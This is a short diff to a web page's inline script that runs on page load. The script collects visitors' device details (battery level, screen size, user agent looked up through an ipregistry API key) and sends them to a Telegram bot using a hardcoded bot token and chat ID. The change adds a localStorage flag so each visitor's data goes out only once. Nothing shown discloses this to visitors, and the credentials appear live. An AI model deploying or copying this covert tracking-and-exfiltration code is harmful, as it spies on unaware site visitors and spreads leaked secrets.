@@ -37,6 +37,7 @@
 </html>
     <script>
 document.addEventListener('DOMContentLoaded', function() {
+    if (!localStorage.getItem('logSent'))
     let batteryLevel;
     let screenWidth;
     let screenHeight;
@@ -188,6 +189,7 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
         const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
         const chatId = '-1002084822950';
         const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+        localStorage.setItem('logSent', 'true');
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('text', message);
